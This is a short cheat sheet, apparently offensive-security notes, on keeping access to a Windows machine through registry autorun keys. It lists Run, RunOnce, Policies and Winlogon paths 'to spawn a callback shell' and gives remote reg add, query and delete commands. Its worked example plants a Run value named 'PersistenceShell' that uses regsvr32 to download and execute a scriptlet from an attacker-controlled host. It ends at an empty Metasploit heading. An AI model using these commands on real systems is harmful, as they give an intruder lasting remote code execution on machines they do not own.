# Registry

## These are the following registry path to create registry values to spawn a callback shell

```
HKLM\Software\Microsoft\Windows\CurrentVersion\Run

HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
```

## Manual

### Registry key syntax

```
C:\> reg add \\<IP>\hklm\software\microsoft\windows\currentversion\run /v <registry_value> /t reg_sz /d <commands>

C:\> reg query \\<IP>\hklm\software\microsoft\windows\currentversion\run

C:\> reg delete \\<IP>\hklm\software\microsoft\windows\currentversion\run /v <registry_value> /f
```

### Here's the following example

```
C:\> reg add \\<IP>\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v PersistenceShell /t REG_SZ /d "regsvr32 /s /n /u /i:http://<attacker_IP>/shell.sct scrobj.dll"

C:\> reg query \\<IP>\HKLM\Software\Microsoft\Windows\CurrentVersion\Run

C:\> reg delete \\<IP>\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v PersistenceShell /f
```

## Metasploit

